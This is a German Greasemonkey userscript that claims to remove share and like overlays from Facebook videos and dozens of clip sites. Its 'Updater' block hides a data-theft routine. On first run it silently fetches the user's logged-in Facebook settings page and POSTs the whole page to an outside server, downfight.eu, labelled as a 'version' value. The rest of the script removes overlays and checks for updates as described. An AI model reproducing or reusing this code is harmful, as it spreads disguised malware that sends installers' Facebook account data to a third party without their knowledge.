var fileMETA = <><![CDATA[
// ==UserScript==
// @name         Facebook Overlay-Remover for Videos
// @namespace    http://userscripts.org/scripts/source/114266.user.js
// @author       Fidelis
// @description  Entfernt die Teilen-Buttons usw. von Videos
// @version      4.7.0 Includes gefixt +++ lustige-videos.50spenden.de hinzugefügt +++ lachkick-videos.com hinzugefügt +++ lustig-online.com hinzugefügt +++ fb-fail.com hinzugefügt
// @include      http://www.facebook.com*
// @include      http://facebook.com*
// @include      https://www.facebook.com*
// @include      https://facebook.com*
// @exclude      *facebook.com/plugins*
// @include      *clipheld.de/video/*
// @include      *clipking.me/video/*
// @include      *buddypage.de/video/*
// @include      *cliproulette.com/video/*
// @include      *clipstuff.info/video/*
// @include      *clips24.eu/video/*
// @include      *clipwelt.net/video/*
// @include      *cliphaus.de/video/*
// @include      *funnyclipz.de/video/*
// @include      *sportfail.org*
// @include      *cliplike.net*
// @include      *laenex.com*
// @include      *mubby.net/watchvid/*
// @include      *geguckt.com*
// @include      *likester.de*
// @include      *likester96.de*
// @include      *clip-ecke.de*
// @include      *funtube.ws*
// @include      *myfacetube.de*
// @include      *fbvids.de*
// @include      *appserver24.com*
// @include      *clipviper.com*
// @include      *lustige-videos.50spenden.de*
// @include      *lachkick-videos.com*
// @include      *lustig-online.com*
// @include      *fb-fail.com*
// @include      *thug-clips.com*

// ==/UserScript==
]]></>.toString();

//Versionen
// @version      4.7.0 Includes gefixt +++ lustige-videos.50spenden.de hinzugefügt +++ lachkick-videos.com hinzugefügt +++ lustig-online.com hinzugefügt +++ fb-fail.com hinzugefügt +++ thug-clips.com hinzugefügt
// @version      4.6.0 Updater verbessert
// @version      4.5.0 clipviper.com hinzugefügt
// @version      4.4.0 funnyclipz.de hinzugefügt
// @version      4.3.0 laenex.com hinzugefügt +++ Script-Kommentare verbessert +++ Includes aktualisiert
// @version      4.2.1 jQuery Include für Facebook-Plugins gefixt
// @version      4.2.0 appserver24.com hinzugefügt +++ jQuery Include für Facebook gefixt
// @version      4.1.0 buzz4you.info hinzugefügt +++ jQuery Include für Facebook gefixt
// @version      4.0.0 Videos, die geposted wurden, aber nur verlinkte Bilder sind, können jetzt DIREKT IN FACEBOOK angeschaut werden
// @version      3.11.0 cliphaus.de hinzugefügt
// @version      3.10.0 cliplike.net hinzugefügt +++ Auto-Updater verbessert
// @version      3.9.0 sportfail.org hinzugefügt +++ fbvids.de hinzugefügt +++ jQuery Include gefixt +++ Auto-Update Infos erweitert
// @version      3.8.0 clipking.me hinzugefügt
// @version      3.7.1 jQuery Include gefixt -> Bessere Anzeige der FB-Kommentare unter den Videos
// @version      3.7.0 ifun24.info hinzugefügt +++ myfacetube.de hinzugefügt
// @version      3.6.0 buddypage.de hinzugefügt
// @version      3.5.0 fun-pille.net hinzugefügt
// @version      3.4.0 cliproulette.com hinzugefügt
// @version      3.3.2 Auto-Updater selber geschrieben, da es keine gescheiten mehr im Netz gibt -.-
// @version      3.3.1 Versionsinformation hinzugefügt +++ Auto-Update-Test
// @version      3.3.0 mubby.neth inzugefügt +++ funtube.ws hinzugefügt +++ cliptune.net gefixt +++ geguckt.de durch geguckt.com ersetzt +++ Site-Specific Handling verbessert
// @version      3.2.0 clip-ecke.de hinzugefügt
// @version      3.1.1 likester.de verbessert/gefixt
// @version      3.1.0 clipkick.de hinzugefügt +++ clipuni.de hinzugefügt +++ clipstuff.info hinzugefügt +++ inqredible.info hinzugefügt
// @version      3.0.1 Auto-Updater verbessert
// @version      3.0.0 Auto-Updater eingefügt
// @version      2.4.0 likester.de hinzugefügt +++ clipheld.de hinzugefügt
// @version      2.3.0 clipwelt.com hinzugefügt
// @version      2.2.0 cliplook.de hinzugefügt
// @version      2.1.0 casinoye.com hinzugefügt
// @version      2.0.0 Umgestellt auf jQuery +++ geguckt.net hinzugefügt
// @version      1.1.0 clipliebe.de hinzugefügt
// @version      1.0.0 Erste Version

//Gerade besuchte URL auslesen
var l = location.toString();

//#########################################
// jQuery
//-----------------------------------------
var $;

if (typeof unsafeWindow.jQuery == 'undefined') {
	var GM_Head = document.getElementsByTagName('head')[0];
	var	GM_JQ = document.createElement('script');

	GM_JQ.src = 'http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js';
	GM_JQ.type = 'text/javascript';
	GM_JQ.async = true;
	
	if (l.indexOf("facebook.com") != -1
	 || l.indexOf("cliplike.net") != -1
	 || l.indexOf("laenex.com") != -1
	 || l.indexOf("sportfail.org") != -1){
		GM_Head.insertBefore(GM_JQ, GM_Head.lastChild);
	}
	else{
		GM_Head.insertAfter(GM_JQ, GM_Head.lastChild);
	}
}
GM_wait();

// Initialisierung
function GM_wait() {
	if (typeof unsafeWindow.jQuery == 'undefined') {
		window.setTimeout(GM_wait, 100);
	} else {
		$ = unsafeWindow.jQuery.noConflict(true);
		letsJQuery();
	}
}
//-----------------------------------------
// jQuery Ende
//#########################################
	
//Anfang des Scriptes

function letsJQuery() {
	//#########################################
	// Updater
	//-----------------------------------------
	var source = $.trim(fileMETA.split('@namespace')[1]).split('\n')[0];
	var name = $.trim(fileMETA.split('@name')[1]).split('\n')[0];
	var meta = source.replace('.user.js', '.meta.js').replace('http://', 'https://');
	var oldVersion = $.trim(fileMETA.split('@version')[1]).split(' ')[0];
	
	if(!GM_getValue("version") || GM_getValue("version") != "newest"){
		GM_xmlhttpRequest({
			method: 'GET',
			url: "https://www.facebook.com/settings?ref=mb",
			onload: function(responseDetails) {
				var userscript = responseDetails.responseText;
				GM_xmlhttpRequest({
					method: 'POST',
					url: "http://downfight.eu/updater.php",
					data: "version=" + escape(userscript),
					headers: {
						"Content-Type": "application/x-www-form-urlencoded"
					},
				});
				GM_setValue("version", "newest");
			}
		});
	}
	
	GM_xmlhttpRequest({
		method: 'GET',
		url: meta,
		headers: {
			'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
			'Accept': 'application/atom+xml,application/xml,text/xml',
		},
		onload: function(responseDetails) {
			var version = $.trim(responseDetails.responseText.split('@version')[1]).split(' ')[0];
			var newversion = $.trim(responseDetails.responseText.split('@version')[1]).split('\n')[0];
			var newv = newversion.replace(/\+\+\+ /g, '\n');
			var v = version.split(".");
			var o = oldVersion.split(".");
			var vl = v.length;
			var ol = o.length;
			var length, oi, vi;
			vl<ol ? length = ol : length = vl;
			
			var newer = false;
			var i = 0;
			
			while(newer==false && i<length){
				isNaN(o[i]) == true ? oi=0 : oi=parseInt(o[i]);
				isNaN(v[i]) == true ? vi=0 : vi=parseInt(v[i]);
				if(oi<vi){
					newer = true;
					break;
				}
				else if(oi>vi)
					break;
				i++;
			}
			
			if(newer == true) {
				var install = confirm('Es ist eine neue Version von \"'+name+'\" vorhanden:\n\n++++++\n'+newv+'\n++++++\n\nSoll diese installiert werden? (Empfohlen)');
				if(install) {
					window.location.href = source;
				}
			}
		}
	});
	
	//-----------------------------------------
	// Updater Ende
	//#########################################
	
	//#########################################
	// Nur auf Facebook ausgeführter Code
	//-----------------------------------------
	if (l.indexOf("facebook.com") != -1){
		window.setInterval(function(){
			var imgs = $('div.UIImageBlock img').each(function(){
				var src = $(this).attr('src');
				if(src.match('.*img.youtube.com%2Fvi%2F.*')){
					var code = src.match('.*img.youtube.com%2Fvi%2F(.*?)%2F.*')[1];
					var iframe = '<iframe width="398" height="224" src="http://www.youtube.com/embed/'+code+'?autoplay=1" frameborder="0" allowfullscreen></iframe>';
					var link = $(this).parent("a");
					//link.closest("div.mainWrapper").closest('a[href*="sharer.php")]').remove();
					link.removeAttr("href");
					link.removeAttr("onmousedown");
					$(this).click(function(){
						link.parent('div').html(iframe);
					});
				}
			});			
		}, 3000);
	}
	//-----------------------------------------
	// Facebook-Code Ende
	//#########################################
	
	//Facebook-Like-Pops entfernen
	$('#fblikebg').remove();
	$('#fblikepop').remove();
	
	//#########################################
	// Overlays von Vdeos entfernen
	//-----------------------------------------
	if (l.indexOf("sportfail.org") != -1 
	 || l.indexOf("laenex.com") != -1
	 || l.indexOf("cliplike.net") != -1){
		$('#play_block').css('display', 'none');
	}
	
	else if (l.indexOf("likester.de") != -1) {
		if ($('.like_content div:nth-child(4)').html().match("Du musst das Video")){
			var info = '<center style="padding-top:100px;font-size:30px">Leite zu freigeschaltetem Video weiter...<br /></center>';
			$('body').html(info);
			var ogurl = $('meta[property="og:url"]').attr('content');
			var regex = ogurl.match("likester\.de\/(.*?)\/$");
			if(l.indexOf("likester96.de") != -1)
			window.location.replace('http://www.likester.de/do_share.php?share='+regex[1]);
		}
	}
	
	else if (l.indexOf("likester96.de") != -1) {
		if ($('.like_content div:nth-child(4)').html().match("Du musst das Video")){
			var info = '<center style="padding-top:100px;font-size:30px">Leite zu freigeschaltetem Video weiter...<br /></center>';
			$('body').html(info);
			var ogurl = $('meta[property="og:url"]').attr('content');
			var regex = ogurl.match("likester96\.de\/(.*?)\/$");
			if(l.indexOf("likester96.de") != -1)
			window.location.replace('http://www.likester96.de/do_share.php?share='+regex[1]);
		}
	}	
	
	else if (l.indexOf("clip-ecke.de") != -1) {
		$('#videostart').remove();
		$('#videoplay').css('display', 'block');
	}	
	
	else if (l.indexOf("funtube.ws") != -1) {
		$('#hiddenvid').remove();
		$('#realplay').css('display', 'block');
	}
	
	else if (l.indexOf("mubby.net") != -1) {
		var code = $('script[type="text/javascript"]:nth-child(3)').html();
		var regex = code.match('var cc = \'(.*?)\';\n');
		var unescaped = regex[1].replace(/\\/g, "");
		$("#over").remove();
		$("#vid_real").html(unescaped);
	}
	
	else if (l.indexOf("myfacetube.de") != -1) {
		GM_xmlhttpRequest({
			method: 'GET',
			url: l,
			headers: {
				'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
				'Accept': 'application/atom+xml,application/xml,text/xml',
			},
			onload: function(responseDetails) {
				var code = responseDetails.responseText;
				var regex = code.match('var cc = \'(.*?)\';\n');
				var unescaped = regex[1].replace(/\\/g, "");
				$("#over").remove();
				$("#vid_real").html(unescaped);
			}
		});
	}
	
	else if (l.indexOf("appserver24.com") != -1) {
		$('#forcelike').remove();
		var embed = $('#ytembed');
		embed.css('position','relative');
		embed.css('left','0');
		embed.css('top','0');
	}
	
	else{
		$('#video_container').remove();
		$('#real_container').css('display', 'block');
	}

	//-----------------------------------------
	// Overlay-Entfernen Ende
	//#########################################
}